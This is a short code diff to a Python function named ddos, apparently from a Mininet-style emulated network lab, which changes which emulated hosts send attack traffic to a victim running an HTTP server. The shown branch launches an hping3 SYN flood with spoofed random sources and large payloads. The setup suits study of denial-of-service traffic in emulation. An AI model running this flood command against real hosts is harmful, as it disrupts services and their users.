@@ -14,7 +14,7 @@ def ddos(n_switch=2, k_hosts=2, type='icmp'):
     victim.cmd(f'python3 -m http.server 80 &')
 
     hosts = net.hosts
-    for host in hosts[1:-1]:
+    for host in hosts[1:]:
         if not str(k_hosts) in host.name:
             if type == 'syn':
                 host.cmd(f'hping3 -S -p 80 --rand-source --flood -d 2048 {victim.IP()} &')
